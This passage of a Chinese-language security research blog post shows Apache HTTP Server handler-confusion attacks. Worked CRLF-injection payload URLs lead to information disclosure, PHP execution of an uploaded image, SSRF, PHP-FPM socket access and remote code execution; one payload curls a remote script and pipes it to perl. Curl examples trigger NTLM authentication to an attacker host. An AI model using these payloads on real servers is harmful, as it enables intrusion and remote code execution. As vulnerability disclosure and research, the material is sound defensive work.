    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">handler</span><span class="p">)</span>
        <span class="n">ap_set_content_type</span><span class="p">(</span><span class="n">new</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">content_type</span><span class="p">);</span>                <span class="c1">// &lt;------ [2]</span>
    <span class="n">access_status</span> <span class="o">=</span> <span class="n">ap_process_request_internal</span><span class="p">(</span><span class="n">new</span><span class="p">);</span>             <span class="c1">// &lt;------ [3]</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">access_status</span> <span class="o">==</span> <span class="n">OK</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">access_status</span> <span class="o">=</span> <span class="n">ap_invoke_handler</span><span class="p">(</span><span class="n">new</span><span class="p">);</span>                   <span class="c1">// &lt;------ [4]</span>
    <span class="p">}</span>
    <span class="n">ap_die</span><span class="p">(</span><span class="n">access_status</span><span class="p">,</span> <span class="n">new</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Httpd 首先創建<sup>[1]</sup>了一個新的請求結構並將當前的 <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> 複<sup>[2]</sup>進去，在處<sup>[3]</sup>完生命週期後呼叫<sup>[4]</sup> <code class="language-plaintext highlighter-rouge">ap_invoke_handler()</code> —— 也就是前面提及包含歷史遺留轉換的地方，所以<strong>在伺服器端轉址中，如果可以控制回應標頭，就可以在 Httpd 中呼叫任意的模組處理器。</strong> 基本上所有 Apache HTTP Server 中的 CGI 系列實作都遵守這個行為，這裡是一個簡單的列表：</p>

<ul>
  <li>mod_cgi</li>
  <li>mod_cgid</li>
  <li>mod_wsgi</li>
  <li>mod_uwsgi</li>
  <li>mod_fastcgi</li>
  <li>mod_perl</li>
  <li>mod_asis</li>
  <li>mod_fcgid</li>
  <li>mod_proxy_scgi</li>
  <li>…</li>
</ul>

<p>至於如何在真實情境中觸發這個伺服器轉址呢？ 由於至少需要控制 HTTP 回應中 <code class="language-plaintext highlighter-rouge">Content-Type</code> 及部分 <code class="language-plaintext highlighter-rouge">Location</code>，這裡給出兩個情境以供參考：</p>

<ol>
  <li>位於 CGI 回應標頭中的 CRLF Injection，透過換行去覆寫已存在的 HTTP 標頭</li>
  <li>可完整控制回應標頭的 SSRF，例如託管在 <code class="language-plaintext highlighter-rouge">mod_wsgi</code> 上的 <a href="https://django-revproxy.readthedocs.io/en/latest/">django-revproxy</a> 專案</li>
</ol>

<p>接下來的範例都基於這個不安全的 CRLF Injection 來做示範：</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl </span>
 
<span class="k">use</span> <span class="nv">CGI</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$q</span> <span class="o">=</span> <span class="nv">CGI</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$redir</span> <span class="o">=</span> <span class="nv">$q</span><span class="o">-&gt;</span><span class="nv">param</span><span class="p">("</span><span class="s2">r</span><span class="p">");</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$redir</span> <span class="o">=~</span> <span class="sr">m{^https?://}</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">print</span> <span class="p">"</span><span class="s2">Location: </span><span class="si">$redir</span><span class="se">\n</span><span class="p">";</span>
<span class="p">}</span>
<span class="k">print</span> <span class="p">"</span><span class="s2">Content-Type: text/html</span><span class="se">\n\n</span><span class="p">";</span>
</code></pre></div></div>

<h5 id="️-3-2-1-arbitrary-handler-to-information-disclosure">✔️ 3-2-1. Arbitrary Handler to Information Disclosure</h5>

<p>首先是從任意模組處理器呼叫到資訊洩漏，這裡使用了 Httpd 內建的 <code class="language-plaintext highlighter-rouge">server-status</code> 模組處理器，這個模組處理器通常只被允許從本機存取：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Location</span><span class="sr"> /server-status</span><span class="p">&gt;
</span>    <span class="nc">SetHandler</span> server-status
    <span class="nc">Require</span> local
<span class="p">&lt;/</span><span class="nl">Location</span><span class="p">&gt;
</span></code></pre></div></div>

<p>在擁有任意模組處理器呼叫後，可以透過複寫 <code class="language-plaintext highlighter-rouge">Content-Type</code> 去存取原本存取不到的敏感資訊：</p>

<blockquote>
  <p>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a <br />
<strong><em>Location:/ooo</em></strong> %0d%0a <br />
<strong><em>Content-Type:server-status</em></strong> %0d%0a <br />
%0d%0a <br /></p>
</blockquote>

<p><img src="/assets/img/blog/20240809/9.png" alt="" /></p>

<h5 id="️-3-2-2-arbitrary-handler-to-misinterpret-scripts">✔️ 3-2-2. Arbitrary Handler to Misinterpret Scripts</h5>

<p>當然也能輕鬆的把一張圖片轉化成 PHP 後門，例如當使用者上傳了一個擁有合法副檔名的檔案後，可以透過這個攻擊手法指定特定模組 <code class="language-plaintext highlighter-rouge">mod_php</code> 去執行檔案內嵌的惡意程式碼，例如：</p>

<blockquote>
  <p>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a <br />
<strong><em>Location:/uploads/avatar.webp</em></strong> %0d%0a <br />
<strong><em>Content-Type:application/x-httpd-php</em></strong> %0d%0a <br />
%0d%0a <br /></p>
</blockquote>

<h5 id="️-3-2-2-arbitrary-handler-to-full-ssrf">✔️ 3-2-2. Arbitrary Handler to Full SSRF</h5>

<p>呼叫 <code class="language-plaintext highlighter-rouge">mod_proxy</code> 存取任何協議以及任意網址當然也不在話下，例如：</p>

<blockquote>
  <p>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a <br />
<strong><em>Location:/ooo</em></strong> %0d%0a <br />
<strong><em>Content-Type:proxy:http://example.com/%3f</em></strong> %0d%0a <br />
%0d%0a <br /></p>
</blockquote>

<p>另外這也是一個可以完整控制 HTTP 請求還有取得所有 HTTP 回應的 SSRF！ 稍微可惜的一點是在存取 Cloud Metadata 時會被 <code class="language-plaintext highlighter-rouge">mod_proxy</code> 會自動加上 <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> 標頭導致被 EC2 及 GCP 的 <a href="https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations">Metadata 保護機制</a>阻擋，否則這會是一個更強大的攻擊手法。</p>

<h5 id="️-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket">✔️ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket</h5>

<p>然而 <code class="language-plaintext highlighter-rouge">mod_proxy</code> 提供了一個更「方便」的功能 —— 可以存取本地的 Unix Domain Socket！ 😉</p>

<p>這裡展示透過存取 PHP-FPM 本地的 Unix Domain Socket 去執行位於 <code class="language-plaintext highlighter-rouge">/tmp/</code> 下的 PHP 後門：</p>

<blockquote>
  <p>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a <br />
<strong><em>Location:/ooo</em></strong> %0d%0a <br />
<strong><em>Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php</em></strong> %0d%0a <br />
%0d%0a <br /></p>
</blockquote>

<p>這個手法理論上還存在著更多的可能性，例如協議走私 (在 HTTP/HTTPS 協議間走私 FastCGI 😏) 或其它易受影響的 Local Sockets 等，這都交給有興趣的人繼續研究了。</p>

<h5 id="️-3-2-4-arbitrary-handler-to-rce">✔️ 3-2-4. Arbitrary Handler to RCE</h5>

<p>最後來展示一下如何透過一個常見的 CTF 小技巧把這個攻擊手法轉化成 RCE！ 由於 PHP 官方的 <a href="https://hub.docker.com/_/php">Docker 映像檔</a> 在建構時引入了 PEAR 這套命令列 PHP 套件管理工具，透過其中的 <code class="language-plaintext highlighter-rouge">Pearcmd.php</code> 作為入口點可以讓我們達成更進一步的利用，詳細的歷史及原理可以參考由 <a href="https://x.com/phithon_xg">Phith0n</a> 撰寫的 <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP LFI 總結文</a>。</p>

<p>這裡我們利用在 <code class="language-plaintext highlighter-rouge">run-tests</code> 內的 Command Injection 來完成整個攻擊鏈，詳細的攻擊鏈如下：</p>

<blockquote>
  <p>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a <br />
<strong><em>Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php</em></strong> %0d%0a <br />
<strong><em>Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php</em></strong> %0d%0a <br />
%0d%0a <br /></p>
</blockquote>

<p>網路上經常在 Security Advisory 或 Bug Bounty 看到把 CRLF Injection 或 Header Injection 當成 XSS 報告，雖然確實有機會透過 SSO 串出 Account Takeover 等精彩漏洞，但請不要忘了它也能串出 Server-Side RCE，這個示範證明了它的可能！</p>

<p><img src="/assets/img/blog/20240809/10.png" alt="" /></p>

<p><br /></p>

<h3 id="-4-其它漏洞">🔥 4. 其它漏洞</h3>

<p>基本上整個 Confusion Attacks 系列到這邊差不多告一個段落，然而在研究 Apache HTTP Server 的過程中還有些值得一提的漏洞因此將它們獨立出來。</p>

<p><br /></p>

<h4 id="️-cve-2024-38472---基於-windows-unc-的-ssrf">⚔️ CVE-2024-38472 - 基於 Windows UNC 的 SSRF</h4>

<p>首先是 <code class="language-plaintext highlighter-rouge">apr_filepath_merge()</code> 函數在 Windows 的實作允許使用 UNC 路徑，下面提供兩種不同的觸發路徑讓攻擊者可以向任意主機發起 NTLM 認證：</p>

<h5 id="️-透過-http-請求解析器觸發">✔️ 透過 HTTP 請求解析器觸發</h5>

<p>想要直接透過 HTTP 請求觸發需要在 Httpd 中設置額外的設定，雖然這個設定第一眼看起來有點不現實，但似乎經常與 Tomcat (<code class="language-plaintext highlighter-rouge">mod_jk</code>、<code class="language-plaintext highlighter-rouge">mod_proxy_ajp</code>) 或是與 <a href="https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes">PATH_INFO</a> 一起出現：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">AllowEncodedSlashes</span> <span class="ss">On</span>
</code></pre></div></div>

<p>另外由於 Httpd 在 2.4.49 後重寫了核心 HTTP 請求解析器邏輯，要在大於此版本的 Httpd 上觸發漏洞需要再額外加上一個設定：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">AllowEncodedSlashes</span> <span class="ss">On</span>
MergeSlashes <span class="ss">Off</span>
</code></pre></div></div>

<p>透過兩個 <code class="language-plaintext highlighter-rouge">%5C</code> 可以使強迫 Httpd 向 <code class="language-plaintext highlighter-rouge">attacker-server</code> 發起 NTLM 認證，實務上也可透過 <a href="https://en.hackndo.com/ntlm-relay/">NTLM Relay</a> 的方式將此 SSRF 轉化成 RCE！</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/%5C%5Cattacker-server/path/to
</code></pre></div></div>

<p><img src="/assets/img/blog/20240809/11.png" alt="" /></p>

<h5 id="️-透過-type-map-觸發">✔️ 透過 Type-Map 觸發</h5>

<p><a href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235">Debian/Ubuntu 的 Httpd 發行版</a>中預設啟用了 Type-Map：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">AddHandler</span> type-map <span class="ss">var</span>
</code></pre></div></div>

<p>透過上傳一個 <code class="language-plaintext highlighter-rouge">.var</code> 檔案到伺服器，將其中 URI 欄位指定成 UNC 路徑也可強迫伺服器向攻擊者發起 NTLM 認證，這也是我所提出的<a href="https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle">第二個 <code class="language-plaintext highlighter-rouge">.var</code> 小技巧</a> 😉</p>

<p><br /></p>

<h4 id="️-cve-2024-39573---基於-rewriterule-前綴可完全控制的-ssrf">⚔️ CVE-2024-39573 - 基於 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 前綴可完全控制的 SSRF</h4>

<p>最後則是當位於 <code class="language-plaintext highlighter-rouge">Server Config</code> 或是 <code class="language-plaintext highlighter-rouge">VirtualHost</code> 中的 <code class="language-plaintext highlighter-rouge">RewriteRule</code> 前綴完全可控時，可以呼叫到 Proxy 以及相關子模組：</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteRule</span> ^/broken(.*) $1
</code></pre></div></div>

<p>透過下列網址可將請求轉交給 <code class="language-plaintext highlighter-rouge">mod_proxy</code> 處理：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/brokenproxy:unix:/run/[...]|http://path/to
</code></pre></div></div>

<p>但如果網管有好好測試，就會發現這樣子的規則是不實際的，所以原本只把它當成另外一個漏洞的搭配組合一起回報，沒想到這個行為也被當成一個安全邊界修復。 再隨著修補出來後也看到其他研究員把同樣行為套用在 Windows UNC 上獲得另外一個額外的 CVE。</p>

<p><br /></p>

<h2 id="未來研究方向">未來研究方向</h2>

<p>最後是關於這份研究的未來的一些展望以及可加強的地方，基本上 Confusion Attacks 仍然是一個很有潛力的攻擊面，尤其是我這次的研究主要也只專注在兩個欄位上而已，只要 Apache HTTP Server 沒有好好從底層進行結構性加強或提供給開發者一個好的開發標準，相信未來還會有更多「混淆」出現！</p>

<p>至於還有哪些方面可以加強呢？ 其實不同的 Httpd 發行版會有不同的設定檔案，因此其它的 Unix-Like 系統例如 RHEL 家族、BSD 系列，甚至使用到 Httpd 的套裝軟體，它們都有機會出現更多可跳脫的重寫規則、更多厲害的 Local Gadgets 甚至意料外的符號跳躍等等 ，就交給有興趣的人繼續吧。</p>

<p>最後由於時程因素，來不及分享更多在實際網站、設備，甚至開源專案上發現並利用的真實案例，不過你應該已經可以想像 —— 在真實世界中絕對還藏著千千萬萬個比想像中還要大量未開採的規則、可繞過的認證，以及隱藏在檯面下的 CGI，至於如何把這篇裡面所講到的技巧實際應用在全世界上？ 接下來就是你們的任務了！</p>

<p><br /></p>

<h2 id="結語">結語</h2>

<p>維護一個 Open Source 專案真的是一件很困難的事，尤其在讓使用者方便的同時兼顧舊版本的相容性，稍有不慎可能就會造成整個系統被攻破 (例如 Httpd 2.4.49 中因為一個路徑處理邏輯小改動導致災難性的 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773">CVE-2021-41773</a>)，整個開發過程必須要小心翼翼的踩在一堆遺留程式碼以及技術債上。 所以如果真的有 Apache HTTP Server 的開發者看到這篇文我想說： 謝謝你們的貢獻！</p>

                    </div>
                    <!-- 文章內容 -->
                </div>
            </article>
            <!-- 文章 end -->
        </section>
        
         <!-- 作者 -->
        <section>
            <div class="container article_footer">
                <div class="author_info">
                    <a href="/blog/author/orange">
                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/orange.png);"></div>
                    </a>
                    <div>
                        <a class="author" href="/blog/author/orange">
                            <h3>Orange Tsai</h3>
                        </a>
                        <span>Principal Security Researcher</span>
                        <p>
                            I am Orange : )
                        </p>
                    </div>
                </div>
            </div>
        </section>
        

        <!-- 相關文章 -->
        <section class="recommand articles-list">
            <div class="container">
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/最新消息">最新消息</a>
                        <span class="tag">
    
                          <a href="/blog/tag/OffSec/">#OffSec</a> <a href="/blog/tag/Windows/">#Windows</a> <a href="/blog/tag/OSEE/">#OSEE</a> <a href="/blog/tag/LiveTraining/">#LiveTraining</a> 
                        </span>
                        <h2>
                            <a href="/blog/2025/07/12/finally-stepping-into-the-world-of-osee-after-five-years/">錯過五年，我終於踏進 OSEE 的世界</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/angelboy">
                            <h3>Angelboy</h3>
                        </a>
                    
                        <span class="date">2025-07-12</span>
                        <p class="line-litmit-3">這邊主要是以平常有在碰 Windows 的人的角度出發。老實說，大約在 5 年前就對 OSEE 這張證照略有所聞，而當時也剛好開始學一些 Windows Pwn 的相關知識，出一些 CTF 題目給大家玩玩，順便增進 Windows 知識，當時也學了一些有關 Windows Kernel 的利用技巧，不過剛開時學時也處處碰壁，花了好一段時間才慢慢學會怎麼去好好搞一個 Windows Kernel Exploit。在得知有這張證照之後，便下定決心未來某一天一定要拿到這張證照。
                        </p>
                    </div>
                </article>
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/最新消息">最新消息</a>
                        <span class="tag">
    
                          <a href="/blog/tag/OffSec/">#OffSec</a> <a href="/blog/tag/Windows/">#Windows</a> <a href="/blog/tag/OSEE/">#OSEE</a> <a href="/blog/tag/LiveTraining/">#LiveTraining</a> 
                        </span>
                        <h2>
                            <a href="/blog/2025/07/11/exp-401-course-and-second-exam-thoughts/">EXP-401 課程 && 第二次考試心得</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/research">
                            <h3>DEVCORE Research Team</h3>
                        </a>
                    
                        <span class="date">2025-07-11</span>
                        <p class="line-litmit-3">EXP-401 (OSEE) 考試第二次挑戰心得公開！從 VMware 到 Windows Kernel，完整分享學習曲線、踩坑經驗、考試細節與重考流程。
                        </p>
                    </div>
                </article>
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/學生相關計劃">學生相關計劃</a>
                        <span class="tag">
    
                          <a href="/blog/tag/公告/">#公告</a> <a href="/blog/tag/徵才/">#徵才</a> 
                        </span>
                        <h2>
                            <a href="/blog/2025/07/07/8th-internship-program-recruit/">DEVCORE 2025 第八屆實習生計畫</a> 
                        </h2>
                    
                    
                        <span class="date">2025-07-07</span>
                        <p class="line-litmit-3">DEVCORE 第八屆實習生計畫將於 2025 年 9 月正式登場，即日起開放報名！歡迎詳閱以下資訊並填寫報名表單，報名至 07/28 23:59 截止。
                        </p>
                    </div>
                </article>
              

            </div>
        </section>
    </div>

    <!-- footer -->
    <footer>
<div class="container footer">
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
        <div class="social">
            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
        </div>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">服務</h6>
        <ul>
            <li><a href="/services/red-team/">紅隊演練</a></li>
            <li><a href="/services/penetration-test/">滲透測試</a></li>
            <li><a href="/services/security-consulting/">資安顧問服務</a></li>
            <li><a href="/services/security-training/">資安教育訓練</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">研究</h6>
        <ul>
            <li><a href="/research/overview/">總覽概要</a></li>
            <li><a href="/research/awards/">競賽與獎項</a></li>
            <li><a href="/research/bug-bounty/">企業漏洞回報</a></li>
            <li><a href="/research/talks/">國際研討會</a></li>
            <li><a href="/research/cve/">CVE 漏洞列表</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">公司</h6>
        <ul>
            <li><a href="/company/about/">公司簡介</a></li>
            <li><a href="/company/our-team/">團隊成員</a></li>
            <li><a href="/company/history/">成就與沿革</a></li>
            <li><a href="/company/csr/">企業社會責任</a></li>
            <li><a href="/company/jobs/">工作機會</a></li>
            <li><a href="/contact/">聯絡我們</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">新聞</h6>
        <ul>
            <li><a href="/blog/">BLOG</a></li>
            <li><a href="/media-kit/">媒體素材下載</a></li>
        </ul>
    </div>

    <!-- divider 分隔線 -->
    <div class="divider"></div>

    <div class="copyright">
        <div class="info">
            <span>© 2025 DEVCORE 戴夫寇爾股份有限公司. <b class="line-block">All rights reserved.</b></span>
            <span><a href="/privacy-policy/">Privacy Policy</a></span>
        </div>
        <div class="lang">
            <!-- <i class="icon translate"></i>
            <select>
                <option value="">Language</option>
                <option value="">中文</option>
                <option value="">English</option>
            </select> -->
            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
        </div>
    </div>

</div>
    </footer>
</body>
</html>

